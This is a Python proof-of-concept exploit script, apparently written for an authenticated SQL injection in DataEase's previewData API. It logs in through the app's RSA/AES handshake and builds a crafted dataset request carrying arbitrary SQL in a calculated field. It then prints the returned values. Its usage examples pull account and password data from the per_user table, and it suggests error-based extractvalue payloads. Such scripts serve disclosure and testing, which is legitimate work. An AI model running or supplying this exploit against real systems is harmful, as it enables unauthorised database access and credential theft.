#!/usr/bin/env python3
"""
Usage:
  python3 PoC.py --url http://TARGET:8100 --user admin --pass 'DataEase@123456'
  python3 PoC.py --sql "SELECT concat(account,0x3a,pwd) FROM per_user LIMIT 1"
  python3 PoC.py --ds-id 985188400292302848 --table per_user   # pin a datasource/table

Requires: requests, cryptography  (pip install requests cryptography)
"""
import argparse, base64, hashlib, json, sys
import requests
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.primitives import padding as sympad
from cryptography.hazmat.primitives.asymmetric import padding
from cryptography.hazmat.primitives.serialization import load_der_public_key

PK_SEP = "-pk_separator-"

def login(base, user, pwd):
    """DataEase RSA/AES login handshake (mirrors the web client)."""
    blob = requests.get(base + "/de2api/dekey", timeout=30).json()["data"]
    sep = base64.urlsafe_b64encode(PK_SEP.encode()).decode()
    enc_pk_b64, aeskey = blob.split(sep)
    key = aeskey.encode(); iv = hashlib.sha256(key).digest()[:16]
    dec = Cipher(algorithms.AES(key), modes.CBC(iv)).decryptor()
    raw = dec.update(base64.b64decode(enc_pk_b64)) + dec.finalize()
    unp = sympad.PKCS7(128).unpadder(); pub_b64 = (unp.update(raw) + unp.finalize()).decode()
    pub = load_der_public_key(base64.b64decode(pub_b64))
    def enc(s): return base64.b64encode(pub.encrypt(s.encode(), padding.PKCS1v15())).decode()
    r = requests.post(base + "/de2api/login/localLogin", json={"name": enc(user), "pwd": enc(pwd)},
                      timeout=30).json()
    if r.get("code") != 0:
        sys.exit("[!] login failed: " + json.dumps(r)[:300])
    data = r["data"]
    return data["token"] if isinstance(data, dict) else data


def api(base, tok, path, body):
    return requests.post(base + "/de2api" + path, headers={"X-DE-TOKEN": tok,
                         "Content-Type": "application/json"}, json=body, timeout=60).json()

def pick_datasource(base, tok, ds_id):
    tree = api(base, tok, "/datasource/tree", {})
    leaves = []
    def walk(n):
        for c in n.get("children") or []:
            if c.get("leaf"): leaves.append(c)
            walk(c)
    for root in tree.get("data", []): walk(root)
    if not leaves:
        sys.exit("[!] no datasources on target — nothing to inject against")
    if ds_id:
        for l in leaves:
            if str(l["id"]) == str(ds_id): return l
        sys.exit("[!] datasource id %s not found" % ds_id)
    print("[*] datasources found:", ", ".join("%s(%s)" % (l["name"], l["id"]) for l in leaves))
    return leaves[0]

def list_tables(base, tok, ds):
    tabs = api(base, tok, "/datasource/getTables",
               {"datasourceId": ds["id"], "isCross": False}).get("data", [])
    return [t["tableName"] for t in tabs]

def fields_of(base, tok, ds, table):
    fs = api(base, tok, "/datasetData/tableField",
             {"datasourceId": ds["id"], "tableName": table, "type": "db",
              "isCross": False, "info": json.dumps({"table": table})}).get("data", [])
    return fs

def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--url", default="http://localhost:8100")
    ap.add_argument("--user")
    ap.add_argument("--pass", dest="pwd")
    ap.add_argument("--token", help="use an existing X-DE-TOKEN instead of logging in")
    ap.add_argument("--sql", default="SELECT version()",
                    help="subquery/expression to inject (must return 1 value)")
    ap.add_argument("--ds-id", help="pin a datasource id (else auto-pick first)")
    ap.add_argument("--table", help="pin a base table (else auto-pick)")
    a = ap.parse_args()
    base = a.url.rstrip("/")

    tok = a.token or login(base, a.user, a.pwd)
    print("[*] token:", tok[:32], "...")

    ds = pick_datasource(base, tok, a.ds_id)
    G, T = "1390000000000000001", "1390000000000000002"

    def try_table(table):
        """Build the malicious dataset DTO for `table`, POST previewData, return (rows, base_names)."""
        cols = fields_of(base, tok, ds, table)
        if not cols:
            return None, None
        base_fields, base_names = [], []
        for i, c in enumerate(cols[:8]):
            nm = "de_c%d" % i; base_names.append(nm)
            base_fields.append({
                "id": "93000000000001%04d" % i, "datasetTableId": T, "datasetGroupId": G,
                "datasourceId": ds["id"], "originName": c["originName"], "name": c["originName"],
                "dataeaseName": nm, "fieldShortName": nm,
                "deType": c.get("deType", 0), "deExtractType": c.get("deType", 0),
                "extField": 0, "groupType": c.get("groupType", "d"), "checked": True,
                "type": c.get("type", "VARCHAR"), "columnIndex": i})
        calc = {"id": "9300000000009999", "datasetTableId": T, "datasetGroupId": G,
                "datasourceId": ds["id"],
                "originName": base64.b64encode(("(" + a.sql + ")").encode()).decode(),
                "name": "calc", "dataeaseName": "de_calc", "fieldShortName": "de_calc",
                "deType": 0, "deExtractType": 0, "extField": 2, "groupType": "d",
                "checked": True, "type": "VARCHAR", "columnIndex": 99}
        union = [{"currentDs": {"id": T, "name": table, "tableName": table, "datasourceId": ds["id"],
                  "datasetGroupId": G, "type": "db", "info": json.dumps({"table": table})},
                  "currentDsField": [f["id"] for f in base_fields],
                  "currentDsFields": base_fields, "childrenDs": [], "unionToParent": None,
                  "allChildCount": 0}]
        dto = {"id": G, "name": "poc", "nodeType": "dataset", "union": union,
               "allFields": base_fields + [calc], "isCross": False}
        r = api(base, tok, "/datasetData/previewData", dto)
        if r.get("code") != 0:
            return {"__err__": (r.get("msg") or json.dumps(r))}, base_names
        return r["data"]["data"]["data"], base_names

    candidates = ([a.table] if a.table else [])
    if not a.table:
        names = list_tables(base, tok, ds)
        candidates = [n for n in names if not n.upper().startswith(("QRTZ_",))] or names

    print("[*] injecting via POST /de2api/datasetData/previewData")
    print("[*] payload SQL:", a.sql)
    for table in candidates:
        rows, base_names = try_table(table)
        if rows is None:
            continue
        if isinstance(rows, dict) and "__err__" in rows:
            if a.table:
                sys.exit("[!] error: " + rows["__err__"][:400])
            continue
        vals = []
        for row in rows:
            for k, v in row.items():
                if k not in base_names and v is not None:
                    vals.append(str(v))
        if vals:
            print("[*] base table used: `%s`" % table)
            print("\n[+] Value(s) returned by the injected expression:")
            for v in sorted(set(vals))[:20]:
                print("    " + v)
            return
    sys.exit("[!] injected OK but no base table had rows to surface a scalar result — "
             "pass --table <populated_table>, or use an error-based --sql "
             "(e.g. \"extractvalue(1,concat(0x7e,version()))\").")

if __name__ == "__main__":
    main()
